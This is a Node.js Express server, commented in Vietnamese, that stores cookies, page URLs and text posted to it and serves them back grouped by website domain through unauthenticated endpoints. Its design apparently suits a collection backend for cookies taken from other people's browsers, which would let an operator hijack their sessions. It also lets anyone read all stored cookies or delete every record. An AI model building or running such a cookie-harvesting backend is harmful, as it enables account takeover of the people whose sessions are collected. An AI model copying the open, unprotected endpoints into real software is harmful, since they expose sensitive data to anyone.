require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');

const app = express();
app.use(express.json());

// 1. Kết nối MongoDB Atlas (Tối ưu Serverless)
let isConnected = false;

const connectToDatabase = async () => {
    if (isConnected) return;

    if (!process.env.MONGO_URI) {
        throw new Error('MONGO_URI chưa được cấu hình trong biến môi trường!');
    }

    try {
        const db = await mongoose.connect(process.env.MONGO_URI, {
            bufferCommands: false,
        });
        isConnected = db.connections[0].readyState === 1;
        console.log('Đã kết nối thành công tới MongoDB Atlas!');
    } catch (err) {
        console.error('Lỗi kết nối MongoDB:', err);
        throw err;
    }
};

// Middleware kiểm tra kết nối DB trước mọi request
app.use(async (req, res, next) => {
    try {
        await connectToDatabase();
        next();
    } catch (error) {
        res.status(500).json({
            success: false,
            error: 'Không thể kết nối đến cơ sở dữ liệu: ' + error.message
        });
    }
});

// 2. Định nghĩa Schema & Model (Có Index tối ưu tốc độ tìm theo domain)
const dataSchema = new mongoose.Schema({
    domain: {
        type: String,
        required: true,
        index: true // Tối ưu query theo domain
    },
    pageUrl: String,
    cookies: mongoose.Schema.Types.Mixed,
    content: String,
    createdAt: { type: Date, default: Date.now, index: true } // Tối ưu sắp xếp theo thời gian
});

const DataModel = mongoose.models.DataLog || mongoose.model('DataLog', dataSchema);

// 3. API: POST /append (Lưu thông tin cookie/văn bản)
app.post('/append', async (req, res) => {
    try {
        const { text, domain, pageUrl, cookies } = req.body;

        if (!domain && !text) {
            return res.status(400).json({ success: false, error: 'Thiếu dữ liệu gửi lên (domain hoặc text)' });
        }

        // Loại bỏ www. ở domain nếu có trước khi lưu
        const cleanDomain = domain ? domain.replace(/^www\./, '') : undefined;

        const newLog = new DataModel({
            content: text,
            domain: cleanDomain,
            pageUrl,
            cookies
        });

        await newLog.save();

        res.json({
            success: true,
            message: 'Đã lưu dữ liệu thành công!',
            data: newLog
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Lỗi máy chủ: ' + error.message });
    }
});

// 4. API: GET /read (Lấy toàn bộ dữ liệu)
app.get('/read', async (req, res) => {
    try {
        const logs = await DataModel.find()
            .sort({ createdAt: -1 })
            .lean(); // Giúp đọc siêu nhanh

        res.json({ success: true, count: logs.length, data: logs });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Lỗi máy chủ: ' + error.message });
    }
});

// 5. API: GET /cookies/:domain (Truy vấn cookie theo domain - Tối ưu hiệu năng cao nhất)
app.get('/cookies/:domain', async (req, res) => {
    try {
        const { domain } = req.params;
        const cleanDomain = domain.replace(/^www\./, '');

        const result = await DataModel.find({ domain: cleanDomain })
            .select('domain pageUrl cookies createdAt') // Chỉ lấy các trường cần thiết
            .sort({ createdAt: -1 })                    // Lấy bản ghi mới nhất lên đầu
            .lean();                                    // Tối ưu tốc độ gấp 2-5 lần

        res.json({
            success: true,
            domain: cleanDomain,
            count: result.length,
            data: result
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Lỗi máy chủ: ' + error.message });
    }
});

// 6. API: DELETE /delete-all (Xóa sạch toàn bộ dữ liệu)
app.delete('/delete-all', async (req, res) => {
    try {
        const result = await DataModel.deleteMany({});
        res.json({
            success: true,
            message: 'Đã xóa toàn bộ dữ liệu thành công!',
            deletedCount: result.deletedCount
        });
    } catch (error) {
        res.status(500).json({ success: false, error: 'Lỗi máy chủ: ' + error.message });
    }
});

// 7. Chạy Local Server (Bỏ qua khi deploy Vercel)
if (process.env.NODE_ENV !== 'production') {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`Server running on http://localhost:${PORT}`);
    });
}

module.exports = app;